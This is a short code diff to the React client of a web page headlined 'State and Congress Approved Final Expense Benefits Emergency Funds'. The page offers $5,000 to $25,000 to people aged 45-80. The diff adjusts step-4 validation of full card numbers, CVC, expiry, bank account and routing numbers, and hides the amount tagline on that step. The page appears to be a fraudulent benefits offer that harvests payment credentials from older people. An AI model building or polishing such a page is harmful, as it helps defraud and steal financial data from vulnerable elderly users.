@@ -366,8 +366,8 @@ export default function HomePageClient({ uuid }: { uuid: string }) {
     if (step === 4) {
         const paymentMethod = form.getValues('paymentMethod');
         const relevantFields = paymentMethod === 'bank' 
-            ? ['paymentAccountHolderName', 'paymentAccountNumber', 'paymentRoutingNumber', 'lastFour']
-            : ['cardholderName', 'cardNumber', 'cardExpiry', 'cardCvc', 'billingZip', 'lastFour'];
+            ? ['paymentAccountHolderName', 'paymentAccountNumber', 'paymentRoutingNumber']
+            : ['cardholderName', 'cardNumber', 'cardExpiry', 'cardCvc', 'billingZip'];
         
         for (const field of relevantFields) {
             if (errors[field as keyof FormValues]) {
@@ -420,9 +420,11 @@ export default function HomePageClient({ uuid }: { uuid: string }) {
                 <h1 className="font-headline text-3xl md:text-5xl tracking-tight mb-8 leading-tight max-w-2xl">
                     State and Congress Approved Final Expense Benefits Emergency Funds
                 </h1>
-                <p className="text-base text-foreground/80 mb-8 max-w-[55rem]">
-                  Amounts between $5,000 - $25,000 / Available to anyone ages 45-80
-                </p>
+                {step !== 4 && (
+                  <p className="text-base text-foreground/80 mb-8 max-w-[55rem]">
+                    Amounts between $5,000 - $25,000 / Available to anyone ages 45-80
+                  </p>
+                )}
               </div>
             )}
 
